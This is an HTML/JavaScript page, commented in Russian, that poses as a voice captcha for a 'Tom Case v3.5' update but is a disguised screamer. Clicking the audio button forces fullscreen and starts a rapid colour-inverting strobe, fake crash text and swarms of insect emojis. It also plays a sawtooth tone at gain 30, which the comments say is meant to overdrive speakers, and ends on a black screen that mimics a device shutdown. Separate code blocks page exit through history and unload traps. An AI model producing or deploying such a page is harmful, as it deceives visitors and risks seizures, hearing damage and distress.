<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Tom Case Simulator // Сбой авторизации</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        
        body {
            background-color: #0d1117;
            color: #c9d1d9;
            font-family: 'Courier New', Courier, monospace;
            overflow: hidden;
            height: 100vh;
            width: 100vw;
            user-select: none;
            display: flex;
            justify-content: center;
            align-items: center;
        }

        /* ТЕКСТУРА БЕТОННОЙ СТЕНЫ ПОД САЙТОМ */
        .concrete-wall {
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            background-color: #3a3a3a;
            background-image: 
                radial-gradient(rgba(255,255,255,0.1) 1px, transparent 0),
                radial-gradient(rgba(0,0,0,0.6) 1px, transparent 0),
                linear-gradient(90deg, rgba(20,20,20,0.3) 1px, transparent 0),
                linear-gradient(rgba(20,20,20,0.3) 1px, transparent 0);
            background-size: 4px 4px, 5px 5px, 25px 25px, 25px 25px;
            opacity: 0;
            z-index: 1;
            transition: opacity 1s ease;
            pointer-events: none;
        }

        /* КИШКИ ИСХОДНОГО КОДЫ */
        .source-code-overlay {
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            font-size: 12px;
            color: rgba(255, 0, 50, 0);
            white-space: pre-wrap;
            padding: 20px;
            z-index: 2;
            pointer-events: none;
            overflow: hidden;
        }

        /* ИНТЕРФЕЙС ГОЛОСОВОЙ КАПЧИ */
        .captcha-box {
            background: #161b22;
            border: 1px solid #30363d;
            border-radius: 8px;
            padding: 30px;
            max-width: 420px;
            width: 90%;
            text-align: center;
            box-shadow: 0 10px 30px rgba(0,0,0,0.6);
            position: relative;
            z-index: 10;
        }

        .captcha-title {
            font-size: 16px;
            color: #58a6ff;
            margin-bottom: 15px;
            font-weight: bold;
            text-transform: uppercase;
        }

        .captcha-text {
            font-size: 13px;
            color: #8b949e;
            margin-bottom: 20px;
            line-height: 1.5;
        }

        .btn-audio {
            background: #21262d;
            color: #c9d1d9;
            border: 1px solid #30363d;
            padding: 12px 20px;
            font-size: 14px;
            border-radius: 6px;
            cursor: pointer;
            font-weight: bold;
            display: inline-flex;
            align-items: center;
            gap: 10px;
            margin-bottom: 20px;
            width: 100%;
            justify-content: center;
        }
        .btn-audio:hover { background: #30363d; border-color: #8b949e; }

        .input-code {
            width: 100%;
            background: #0d1117;
            border: 1px solid #30363d;
            padding: 10px;
            color: white;
            font-size: 16px;
            text-align: center;
            border-radius: 6px;
            margin-bottom: 15px;
            outline: none;
        }

        /* ТАРАКАНЫ И ПАУКИ */
        .bug {
            position: fixed;
            z-index: 99999;
            pointer-events: none;
            user-select: none;
            transition: transform 0.08s linear;
        }

        /* ЭФФЕКТЫ УНИЧТОЖЕНИЯ МАТРИЦЫ */
        #glitch-screen {
            position: fixed;
            top: 0; left: 0; width: 100vw; height: 100vh;
            background: #000;
            z-index: 99998;
            display: none;
        }

        .matrix-damage {
            animation: matrixFlicker 0.04s infinite;
        }

        @keyframes matrixFlicker {
            0% { background: #000; filter: invert(0); }
            25% { background: #fff; border-top: 50px solid #f00; border-bottom: 50px solid #00f; }
            50% { background: #111; border-left: 100px solid #0f0; }
            75% { background: #fff; border-right: 70px solid #ff0; }
            100% { background: #000; filter: invert(1); }
        }

        /* ФИНАЛЬНЫЙ БЛЭКАУТ */
        #blackout-screen {
            position: fixed;
            top: 0; left: 0; width: 100vw; height: 100vh;
            background: #000000;
            z-index: 9999999;
            display: none;
            cursor: none;
        }
    </style>
</head>
<body>

    <div class="concrete-wall" id="concrete"></div>
    <div class="source-code-overlay" id="codeLayer"></div>
    <div id="glitch-screen"></div>
    <div id="blackout-screen"></div>

    <div class="captcha-box" id="captchaBox">
        <div class="captcha-title">🤖 Проверка: Голосовая капча</div>
        <div class="captcha-text">
            Для доступа к обновлению <b>Tom Case v3.5</b> включите звук на вашем устройстве, нажмите кнопку ниже и введите продиктованный код безопасности.
        </div>
        
        <button class="btn-audio" id="playAudioBtn">🔊 Воспроизвести аудио-код</button>
        
        <input type="text" class="input-code" placeholder="Введите 4 цифры..." disabled>
    </div>

    <script>
        const bugTypes = ['🪳', '🕷️', '🐛'];
        const playAudioBtn = document.getElementById('playAudioBtn');
        const captchaBox = document.getElementById('captchaBox');
        const concrete = document.getElementById('concrete');
        const codeLayer = document.getElementById('codeLayer');
        const glitchScreen = document.getElementById('glitch-screen');
        const blackoutScreen = document.getElementById('blackout-screen');

        const rawCodeText = `Е7вшпомзещчна9нщаН8АШПХВЕ86А9ОЗМВЕЩФГАХС\nFATAL_CORE_CRASH: Audio overflow at gain_node_30\nDESTROYING_DISPLAY_MATRIX... SUCCESS\n`;

        // Запрет на выход
        window.onbeforeunload = function() { return "ALERT"; };
        setInterval(() => { window.history.pushState(null, "", window.location.href); }, 100);

        playAudioBtn.addEventListener('click', () => {
            // 1. Мгновенно заваливаем в Fullscreen, пока человек ждет цифры
            if (document.documentElement.requestFullscreen) {
                document.documentElement.requestFullscreen();
            } else if (document.documentElement.webkitRequestFullscreen) {
                document.documentElement.webkitRequestFullscreen();
            }

            // 2. Включаем безумное мерцание матрицы экрана и глитч-кода
            captchaBox.style.display = 'none';
            glitchScreen.style.display = 'block';
            glitchScreen.classList.add('matrix-damage');
            
            concrete.style.opacity = "0.95"; // Проявляется бетон

            codeLayer.style.fontSize = "24px";
            codeLayer.style.color = "#ffffff";
            codeLayer.innerText = rawCodeText.repeat(250);

            // 3. Выпускаем ОРДУ тараканов и пауков (55 штук) поверх мигания
            for (let i = 0; i < 55; i++) {
                spawnMadBug();
            }

            // 4. ЖЕСТКИЙ ПЕРЕГРУЗ ЗВУКА НА МАКСИМУМЕ (Gain = 30)
            try {
                const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
                const osc = audioCtx.createOscillator();
                const gain = audioCtx.createGain();
                
                osc.type = 'sawtooth'; // Пила — самый режущий звук
                osc.frequency.setValueAtTime(100, audioCtx.currentTime); // Низкий страшный гул перерастающий в визг
                
                // Выкручиваем буст звука на 30! Это заставит динамики хрипеть на физическом пределе
                gain.gain.setValueAtTime(30, audioCtx.currentTime); 
                
                osc.connect(gain);
                gain.connect(audioCtx.destination);
                osc.start();

                // Модуляция частоты: симулирует взрыв и поломку звуковой платы
                setInterval(() => {
                    osc.frequency.setValueAtTime(Math.random() * 1400 + 50, audioCtx.currentTime);
                }, 30);
            } catch (e) {
                console.log("Audio block error", e);
            }

            // 5. Через 4.5 секунды этого безумия — резкий обрыв в ТЕМНОТУ (Выключение устройства)
            setTimeout(() => {
                glitchScreen.style.display = 'none';
                concrete.style.display = 'none';
                codeLayer.style.display = 'none';
                
                const activeBugs = document.querySelectorAll('.bug');
                activeBugs.forEach(b => b.remove());

                // Черный экран смерти
                blackoutScreen.style.display = 'block';
            }, 4500);
        });

        // ДВИЖЕНИЕ НАСЕКОМЫХ РЫВКАМИ И ПОВОРОТАМИ
        function spawnMadBug() {
            const bug = document.createElement('div');
            bug.className = 'bug';
            bug.style.fontSize = (Math.random() * 25 + 45) + 'px'; // Большие размеры
            bug.innerText = bugTypes[Math.floor(Math.random() * bugTypes.length)]; 
            document.body.appendChild(bug);

            let x = Math.random() * window.innerWidth;
            let y = Math.random() * window.innerHeight;
            let angle = Math.random() * 360;

            bug.style.left = '0px';
            bug.style.top = '0px';

            setInterval(() => {
                let speed = Math.random() > 0.6 ? Math.random() * 110 + 40 : Math.random() * 20;
                angle += (Math.random() - 0.5) * 90;
                let rad = angle * Math.PI / 180;
                
                x += Math.cos(rad) * speed;
                y += Math.sin(rad) * speed;

                if (x < -60) x = window.innerWidth;
                if (x > window.innerWidth + 60) x = -50;
                if (y < -60) y = window.innerHeight;
                if (y > window.innerHeight + 60) y = -50;

                bug.style.transform = `translate(${x}px, ${y}px) rotate(${angle + 90}deg)`;
            }, 75);
        }
    </script>
</body>
</html>
